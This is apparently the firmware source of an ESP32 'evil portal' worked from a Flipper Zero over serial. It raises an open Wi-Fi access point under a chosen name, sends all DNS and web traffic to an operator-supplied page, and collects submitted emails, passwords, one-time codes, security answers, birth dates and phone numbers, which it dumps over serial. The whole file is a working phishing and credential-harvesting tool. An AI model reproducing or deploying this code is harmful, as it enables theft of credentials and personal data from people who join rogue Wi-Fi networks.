#include "ESPAsyncWebServer.h"
#include <AsyncTCP.h>
#include <DNSServer.h>
#include <WiFi.h>

#define MAX_HTML_SIZE 20000

#define B_PIN 4
#define G_PIN 5
#define R_PIN 6

#define WAITING 0
#define GOOD 1
#define BAD 2

#define SET_HTML_CMD "sethtml="
#define SET_AP_CMD "setap="
#define RESET_CMD "reset"
#define START_CMD "start"
#define ACK_CMD "ack"
#define STOP_CMD "stop"
#define LOG_CMD "log"
#define LED_CMD "led="

// GLOBALS
DNSServer dnsServer;
AsyncWebServer server(80);

bool runServer = false;

String user_name;
String password;
bool name_received = false;
bool password_received = false;

String first_name;
String last_name;
String secret_question;
String secret_answer;
String otp;
String dob;
String mobile_number;
String gender;

char apName[30] = "PORTAL";
char index_html[MAX_HTML_SIZE] = "TEST";

// RESET
void (*resetFunction)(void) = 0;

// AP FUNCTIONS
class CaptiveRequestHandler : public AsyncWebHandler
{
public:
  CaptiveRequestHandler() {}
  virtual ~CaptiveRequestHandler() {}

  bool canHandle(AsyncWebServerRequest *request)
  {
    return true;
  }

  void handleRequest(AsyncWebServerRequest *request)
  {
    request->send(200, "text/html", index_html);
  }
};

void setLed(int i)
{
  if (i == WAITING)
  {
    digitalWrite(B_PIN, LOW);
    digitalWrite(G_PIN, HIGH);
    digitalWrite(R_PIN, HIGH);
  }
  else if (i == GOOD)
  {
    digitalWrite(B_PIN, HIGH);
    digitalWrite(G_PIN, LOW);
    digitalWrite(R_PIN, HIGH);
  }
  else
  {
    digitalWrite(B_PIN, HIGH);
    digitalWrite(G_PIN, HIGH);
    digitalWrite(R_PIN, LOW);
  }
}

void setupServer()
{
  // Start DNS server
  dnsServer.start(53, "*", WiFi.softAPIP());

  // Redirect all unknown requests to the portal
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  server.onNotFound([](AsyncWebServerRequest *request)
                    { request->redirect("/"); });

  // Common connectivity test URLs
  server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request)
            { request->send(200, "text/html", index_html); });
  server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *request)
            { request->send(200, "text/html", index_html); });

  // Serve the portal page
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request)
            {
    request->send(200, "text/html", index_html);
    Serial.println("Client accessed the portal."); });

  // Handle command execution
  server.on("/command", HTTP_POST, [](AsyncWebServerRequest *request)
            {
    String command = request->arg("command");
    if (command.startsWith("sethtml=")) {
        // Convert String to char array and update index_html
        command.substring(8).toCharArray(index_html, MAX_HTML_SIZE);
        request->send(200, "text/plain", "HTML updated!");
    } else if (command.startsWith("setap=")) {
        String newApName = command.substring(6);
        WiFi.softAP(newApName.c_str());
        request->send(200, "text/plain", "AP name updated!");
    } else {
        request->send(400, "text/plain", "Unknown command.");
    } });

  server.on("/get", HTTP_GET, [](AsyncWebServerRequest *request)
            {
    String inputMessage;
    String inputParam;

    if (request->hasParam("email")) {
      inputMessage = request->getParam("email")->value();
      inputParam = "email";
      user_name = inputMessage;
      name_received = true;
    }

    if (request->hasParam("password")) {
      inputMessage = request->getParam("password")->value();
      inputParam = "password";
      password = inputMessage;
      password_received = true;
    }

    if (request->hasParam("first_name")) {
      first_name = request->getParam("first_name")->value();
    } else {
      first_name = "";
    }

    if (request->hasParam("last_name")) {
      last_name = request->getParam("last_name")->value();
    } else {
      last_name = "";
    }

    if (request->hasParam("secret_question")) {
      secret_question = request->getParam("secret_question")->value();
    } else {
      secret_question = "";
    }

    if (request->hasParam("secret_answer")) {
      secret_answer = request->getParam("secret_answer")->value();
    } else {
      secret_answer = "";
    }

    if (request->hasParam("otp")) {
      otp = request->getParam("otp")->value();
    } else {
      otp = "";
    }

    if (request->hasParam("dob")) {
      dob = request->getParam("dob")->value();
    } else {
      dob = "";
    }

    if (request->hasParam("mobile_number")) {
      mobile_number = request->getParam("mobile_number")->value();
    } else {
      mobile_number = "";
    }

    if (request->hasParam("gender")) {
      gender = request->getParam("gender")->value();
    } else {
      gender = "";
    }

    request->send(
        200, "text/html",
        "<html><head><script>setTimeout(() => { window.location.href ='/' }, 100);</script></head><body></body></html>"); });

  // Start the server
  server.begin();
  Serial.println("Server started.");
}

void stopServer()
{
  server.end();
  dnsServer.stop();
  Serial.println("Server stopped.");
}

void startAP()
{
  Serial.print("starting ap ");
  Serial.println(apName);

  WiFi.mode(WIFI_AP);
  WiFi.softAP(apName);

  Serial.print("ap ip address: ");
  Serial.println(WiFi.softAPIP());

  setupServer();

  dnsServer.start(53, "*", WiFi.softAPIP());
  server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
  server.begin();
}

bool checkForCommand(char *command)
{
  bool received = false;
  if (Serial.available() > 0)
  {
    String flipperMessage = Serial.readString();
    const char *serialMessage = flipperMessage.c_str();
    int compare = strncmp(serialMessage, command, strlen(command));
    if (compare == 0)
    {
      received = true;
    }
  }
  return received;
}

void getInitInput()
{
  // wait for html
  Serial.println("Waiting for HTML");
  bool has_ap = false;
  bool has_html = false;
  while (!has_html || !has_ap)
  {
    if (Serial.available() > 0)
    {
      String flipperMessage = Serial.readString();
      const char *serialMessage = flipperMessage.c_str();
      if (strncmp(serialMessage, SET_HTML_CMD, strlen(SET_HTML_CMD)) == 0)
      {
        serialMessage += strlen(SET_HTML_CMD);
        strncpy(index_html, serialMessage, strlen(serialMessage) - 1);
        has_html = true;
        Serial.println("html set");
      }
      else if (strncmp(serialMessage, SET_AP_CMD, strlen(SET_AP_CMD)) == 0)
      {
        serialMessage += strlen(SET_AP_CMD);
        strncpy(apName, serialMessage, strlen(serialMessage) - 1);
        has_ap = true;
        Serial.println("ap set");
      }
      else if (strncmp(serialMessage, RESET_CMD, strlen(RESET_CMD)) == 0)
      {
        resetFunction();
      }
    }
  }
  Serial.println("all set");
}

void startPortal()
{
  // wait for flipper input to get config index
  startAP();

  runServer = true;
}

// MAIN FUNCTIONS
void setup()
{

  // init LED pins
  pinMode(B_PIN, OUTPUT);
  pinMode(G_PIN, OUTPUT);
  pinMode(R_PIN, OUTPUT);

  setLed(WAITING);

  Serial.begin(115200);

  // wait for init flipper input
  getInitInput();

  setLed(GOOD);

  startPortal();
}

void loop()
{
  dnsServer.processNextRequest();
  if (name_received && password_received)
  {
    name_received = false;
    password_received = false;
    String logValue1 = "Username: " + user_name;
    String logValue2 = "Password: " + password;

    Serial.println("---------------------------------------"); // Added semicolon
    Serial.println(logValue1);
    Serial.println(logValue2);
    if (!first_name.isEmpty()) {
      Serial.println("first name: " + first_name);
    }
    if (!last_name.isEmpty()) {
      Serial.println("last name: " + last_name);
    }
    if (!secret_question.isEmpty()) {
      Serial.println("Secret Q: " + secret_question);
    }
    if (!secret_answer.isEmpty()) {
      Serial.println("Secret A: " + secret_answer);
    }
    if (!otp.isEmpty()) {
      Serial.println("OTP: " + otp);
    }
    if (!dob.isEmpty()) {
      Serial.println("DOB: " + dob);
    }
    if (!mobile_number.isEmpty()) {
      Serial.println("Mobile No: " + mobile_number);
    }
    if (!gender.isEmpty()) {
      Serial.println("Gender: " + gender);
    }
    Serial.println("---------------------------------------"); // Added semicolon
  }
  if (checkForCommand(RESET_CMD))
  {
    Serial.println("reseting");
    resetFunction();
  }
  if (checkForCommand(STOP_CMD))
  {
    Serial.println("stopping server");
    stopServer();
  }
  if (checkForCommand(LOG_CMD))
  {
    Serial.println("sending logs");
    // Send logs to Flipper Zero
    Serial.println("---------------------------------------");
    Serial.println("Username: " + user_name);
    Serial.println("Password: " + password);
    if (!first_name.isEmpty()) {
      Serial.println("first name: " + first_name);
    }
    if (!last_name.isEmpty()) {
      Serial.println("last name: " + last_name);
    }
    if (!secret_question.isEmpty()) {
      Serial.println("Secret Q: " + secret_question);
    }
    if (!secret_answer.isEmpty()) {
      Serial.println("Secret A: " + secret_answer);
    }
    if (!otp.isEmpty()) {
      Serial.println("OTP: " + otp);
    }
    if (!dob.isEmpty()) {
      Serial.println("DOB: " + dob);
    }
    if (!mobile_number.isEmpty()) {
      Serial.println("Mobile No: " + mobile_number);
    }
    if (!gender.isEmpty()) {
      Serial.println("Gender: " + gender);
    }
    Serial.println("---------------------------------------");
  }
  if (checkForCommand(LED_CMD))
  {
    Serial.println("setting LED");
    // Example: Set LED to GOOD
    setLed(GOOD);
  }
}